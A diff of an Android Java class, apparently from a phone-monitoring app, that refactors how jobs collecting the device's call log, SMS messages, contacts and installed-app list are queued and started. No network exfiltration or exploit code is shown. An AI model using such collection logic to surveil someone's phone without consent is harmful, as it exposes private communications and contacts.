@@ -1,6 +1,8 @@
 package com.inet.android.list;
 
+import com.inet.android.request.ConstantValue;
 import com.inet.android.utils.Logging;
+import com.inet.android.utils.ValueWork;
 
 import android.content.Context;
 import android.content.SharedPreferences;
@@ -28,31 +30,31 @@ public class TurnSendList {
 
 	}
 
-	public static void setList(int list, String value, String busy,
+	public static void setList(int list, int value, String busy,
 			Context mContext) {
-		Logging.doLog(LOG_TAG, "list " + list + "value " + value + "busy = "
-				+ busy, "list " + list + "value " + value + "busy = " + busy);
+		Logging.doLog(LOG_TAG, "list " + list + " value " + value + " busy = "
+				+ busy, "list " + list + " value " + value + " busy = " + busy);
 		SharedPreferences sp = PreferenceManager
 				.getDefaultSharedPreferences(mContext);
 		Editor ed = sp.edit();
 		if (busy != null)
 			ed.putString("busy", busy);
 		switch (list) {
-		case 1:
-			ed.putString("list_call", value);
+		case ConstantValue.TYPE_LIST_CALL:
+			ed.putInt("list_call", value);
 			break;
-		case 2:
-			ed.putString("list_sms", value);
+		case ConstantValue.TYPE_LIST_SMS:
+			ed.putInt("list_sms", value);
 			break;
-		case 3:
-			ed.putString("list_contact", value);
+		case ConstantValue.TYPE_LIST_CONTACTS:
+			ed.putInt("list_contact", value);
 			break;
-		case 4:
-			ed.putString("list_app", value);
+		case ConstantValue.TYPE_LIST_APP:
+			ed.putInt("list_app", value);
 			break;
 		default:
 			break;
-		}	
+		}
 		Logging.doLog(LOG_TAG, "list = " + value, "list = " + value);
 		ed.commit();
 		startGetList(mContext);
@@ -65,38 +67,39 @@ public class TurnSendList {
 
 		Logging.doLog(LOG_TAG, "startGetList() ", "startGetList() ");
 		if (sp.getString("busy", "0").equals("0")) {
-			Logging.doLog(
-					LOG_TAG,
-					"StartGetList busy = "
-							+ sp.getString("StartGetList busy", "0"), "busy = "
-							+ sp.getString("busy", "0"));
-			if (!sp.getString("list_call", "0").equals("0")) {
+			Logging.doLog(LOG_TAG,
+					"StartGetList busy = " + sp.getString("busy", "0"),
+					"busy = " + sp.getString("busy", "0"));
+			if (ValueWork.getMethod(ConstantValue.TYPE_LIST_CALL, mContext) != 0) {
 				Logging.doLog(LOG_TAG, "list_call go", "list_call go");
 				ed.putString("busy", "1");
 				ed.commit();
 				ListCall arhCall = new ListCall();
 				arhCall.execute(mContext);
 				return;
-			} else if (!sp.getString("list_sms", "0").equals("0")) {
+			} else if (ValueWork.getMethod(ConstantValue.TYPE_LIST_SMS,
+					mContext) != 0) {
 				Logging.doLog(LOG_TAG, "list_sms go", "list_sms go");
 				ed.putString("busy", "1");
 				ed.commit();
 				ListSms arhSms = new ListSms();
 				arhSms.execute(mContext);
 				return;
-			} else if (!sp.getString("list_app", "0").equals("0")) {
-				Logging.doLog(LOG_TAG, "list_app go", "list_app go");
-				ed.putString("busy", "1");
-				ed.commit();
-				ListApp listApp = new ListApp();
-				listApp.getListOfInstalledApp(mContext);
-				return;
-			} else if (!sp.getString("list_contact", "0").equals("0")) {
+			} else if (ValueWork.getMethod(ConstantValue.TYPE_LIST_CONTACTS,
+					mContext) != 0) {
 				Logging.doLog(LOG_TAG, "list_contact go", "list_contact go");
 				ed.putString("busy", "1");
 				ed.commit();
 				ListContacts getCont = new ListContacts();
 				getCont.execute(mContext);
+				return;
+			} else if (ValueWork.getMethod(ConstantValue.TYPE_LIST_APP,
+					mContext) != 0) {
+				Logging.doLog(LOG_TAG, "list_app go", "list_app go");
+				ed.putString("busy", "1");
+				ed.commit();
+				ListApp listApp = new ListApp();
+				listApp.getListOfInstalledApp(mContext);
 				return;
 			}
 		} else
